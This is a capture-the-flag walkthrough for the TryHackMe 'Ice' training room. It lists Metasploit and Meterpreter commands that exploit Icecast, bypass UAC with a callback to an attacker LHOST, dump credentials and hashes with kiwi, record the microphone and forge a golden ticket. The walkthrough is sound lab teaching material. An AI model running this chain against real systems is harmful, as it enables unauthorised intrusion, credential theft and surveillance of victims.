# Ice

**Room Link:** [https://tryhackme.com/room/ice](https://tryhackme.com/room/ice)



## Recon

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Gain Access

**Kali**

```
msfconsole
```

**Metasploit**

```
search icecast
use 0
set RHOSTS $VICTIM
run
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Escalate



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
run post/multi/recon/local_exploit_suggester
background
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**Metasploit**

```
use exploit/windows/local/bypassuac_eventvwr
set SESSIONS 1
set LHOST $KALI
run
```

We are still user dark but have a lot of privilege's now

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Looting

**Meterpreter**

```
ps
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
ps
migrate -N spoolsv.exe
```

**Meterpreter**

```
load kiwi
creds_all
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
hashdump
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
screenshare
record_mic
golden_ticket_create
```





















